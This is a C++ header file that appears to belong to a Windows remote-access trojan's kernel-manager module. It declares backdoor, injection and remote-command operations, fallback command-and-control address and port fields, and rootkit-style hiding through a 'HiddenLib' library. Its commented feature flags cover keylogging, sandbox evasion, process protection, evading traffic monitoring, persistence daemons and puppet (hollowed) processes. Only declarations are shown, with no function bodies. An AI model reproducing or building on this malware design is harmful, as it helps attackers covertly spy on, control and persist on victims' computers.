#pragma once
#include "Manager.h"
#include <Windows.h>
#include <iostream>
#include <stdlib.h>
#include <Shlobj.h>
#include "HiddenLib.h"


enum
{
	COMMAND_KERNEL_INIT,
	COMMAND_KERNEL_GETSTATE,
	COMMAND_KERNEL_SETSTATE_CONTINUE,
	COMMAND_KERNEL_SETSTATE_PROCESS,
	COMMAND_KERNEL_SETSTATE_STOP,
	COMMAND_KERNEL_RUNCOMMAND,
	COMMAND_KERNEL_DELCOMMAND,
	COMMAND_KERNEL_WRITERCOMMAND,
	COMMAND_KERNEL_BACKDOOR,

	COMMAND_KERNEL_DEL,
	COMMAND_KERNEL_INJECT,
	TOKEN_KERNEL_RETURNINFO,
};

enum 
{
	INITSUC,
	INITUNSUC,


	COMMANDERROR,

};

struct BACKDOOR
{
	BYTE Token;
	TCHAR ip[255];
	TCHAR port[30];
};


struct RETURNINFO
{
	BYTE Token;
	BYTE mode;
	TCHAR info[1024];
};

struct RUNCOMMAND
{
	BYTE Token;
	int  argc;
	TCHAR Command[1024];
};

struct Function
{
	BOOL IsKeyboard;		//键盘离线记录
	BOOL IsAntiSimulation;	//反沙箱
	BOOL ProtectedProcess;	//进程保护
	BOOL antinet;			//反查流量
	BOOL RunDllEntryProc;	//是否运行DLL入口

	BOOL  Processdaemon;	//进程守护
	BOOL  puppet;			//傀儡进程
	BOOL  special;			//特别
	BOOL  bool4;	//备用
	BOOL  bool5;	//备用


	TCHAR other1[255];  //备用
	TCHAR other2[255];  //备用
	TCHAR other3[255];  //备用
	TCHAR other4[255];	//备用
	TCHAR other5[255];  //备用
};


struct Info
{
	char mark[30];		//标记
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//端口
	BOOL IsTcp;			//通信模式
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//端口
	BOOL IsTcp2;			//通信模式
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//端口
	BOOL IsTcp3;			//通信模式
	TCHAR szRunSleep[30];	//运行等待（开始运行时等待时间 防止手动查看流量监控）
	TCHAR szHeart[30];		//重连时间
	TCHAR szGroup[50];		//分组
	TCHAR szVersion[50];	//版本
	TCHAR Remark[50];		//备注
	Function otherset;		//其他设置
};

class CKernelManager : public CManager
{
public:
	BOOL m_buser;
	CKernelManager(ISocketBase* pClient);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:

	void Initialize();
	void  GetState( );
	void SetState(HidActiveState state);


	void runcommand(int argc, TCHAR* Command);
	void delcommand(int argc, TCHAR* Command);
	void writercommand(int argc, TCHAR* Command);
protected:
	BOOL IsWindowsX64();
	void SendReturnInfo(BYTE mode ,TCHAR* info);

	HidContext m_context;
	HidContext GetContext();

	HidRegRootTypes GetTypeAndNormalizeRegPath(std::wstring& regPath);
	HidRegRootTypes GetRegType(std::wstring& path);
	void SetRegvalue(TCHAR* name, TCHAR* val, int nSize);
	bool GetMultiStrValue(const wchar_t* name, std::vector<std::wstring>& strs);
	bool SetMultiStrValue(const wchar_t* name, const std::vector<std::wstring>& strs);

	int memfind(const char* mem, const char* str, int sizem, int sizes);
	BOOL SetInternetStatus(bool enable);
};

